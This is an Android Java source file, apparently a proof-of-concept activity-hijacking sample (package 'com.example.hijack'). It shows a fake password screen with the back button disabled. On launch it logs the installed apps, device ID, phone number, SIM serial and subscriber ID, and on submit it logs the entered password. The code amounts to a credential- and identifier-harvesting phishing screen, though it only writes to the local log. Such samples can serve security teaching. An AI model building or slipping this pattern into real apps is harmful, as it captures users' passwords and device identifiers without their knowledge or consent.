package com.example.hijack;

import java.util.List;

import android.app.Activity;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class PasswordActivity extends Activity {
    private static final String TAG = "PasswordActivity";
    
    Button   mOkButton;
    EditText mPasswordText;
    private PackageManager mPackageManager;
    private boolean mFinish = false;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.password);
        mPasswordText = (EditText) findViewById(R.id.password);
        mOkButton = (Button) findViewById(R.id.password_ok);
        
        mPackageManager = this.getPackageManager();
        List<PackageInfo> packageInfos =  mPackageManager.getInstalledPackages(0);
        for (PackageInfo packageInfo: packageInfos) {
            Log.d(TAG, "packageInfo.packageName = " + packageInfo.packageName + 
                    " packageInfo.appName = " + packageInfo.applicationInfo.loadLabel(this.getPackageManager()).toString()
                    + " packageInfo.applicationInfo.flags = " + packageInfo.applicationInfo.flags );
        }
        
        
        TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
        
        String deviceid = tm.getDeviceId();
        String tel = tm.getLine1Number();
        String imei = tm.getSimSerialNumber();
        String imsi = tm.getSubscriberId();
        
        Log.d(TAG, "deviceid = " + deviceid + " tel = " + tel + " imei = " + imei + " imsi = " + imsi);
        
        mOkButton.setOnClickListener(new View.OnClickListener() {
            
            public void onClick(View v) {
                
                String password = mPasswordText.getText().toString();
                Log.v(TAG, "password" + password);
                mFinish = true;
                finish();
            }
        });
    }

    public void onBackPressed() {
        
    }
    
    public void onPause(){
        super.onPause();
        
        if ( !mFinish ) {
            finish();
        }
    }
}
